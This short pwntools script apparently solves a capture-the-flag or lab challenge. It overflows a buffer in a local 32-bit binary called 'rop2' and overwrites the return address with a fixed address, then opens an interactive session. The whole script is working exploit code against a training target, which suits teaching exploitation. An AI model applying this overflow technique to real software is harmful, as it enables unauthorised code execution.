from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

p = process('./rop2')

payload = 'a'*0x88 + 'b'*4 + p32(0x080484a4)

p.sendline(payload)
#p.recv()
#gdb.attach(p)

p.interactive()
